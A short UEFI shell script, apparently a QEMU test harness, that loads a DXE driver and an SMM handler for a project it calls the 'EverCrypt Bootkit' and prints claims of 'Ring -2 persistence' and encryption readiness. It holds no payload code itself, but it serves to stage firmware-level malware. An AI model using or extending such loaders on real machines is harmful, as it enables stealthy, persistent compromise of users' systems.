@echo -off
echo ""
echo "================================================="
echo "  🚀 EverCrypt Bootkit - QEMU Test"
echo "================================================="
echo ""
echo "[*] Loading EverCrypt DXE Driver..."
load fs0:\EverCryptDxe.efi
if %lasterror% ne 0 then
    echo "[!] Failed to load DXE driver"
    goto end
endif

echo "[*] Loading EverCrypt SMM Handler..."
load fs0:\EverCryptSmm.efi
if %lasterror% ne 0 then
    echo "[!] Failed to load SMM handler"
    goto end
endif

echo ""
echo "================================================="
echo "  ✅ SUCCESS: EverCrypt Loaded!"
echo "================================================="
echo ""
echo "[✓] Ring -2 persistence active"
echo "[✓] ChaCha20-Poly1305 encryption ready"
echo "[✓] SMM handler installed"
echo ""
echo "Test complete. Exiting in 5 seconds..."
stall 5000000
exit
:end
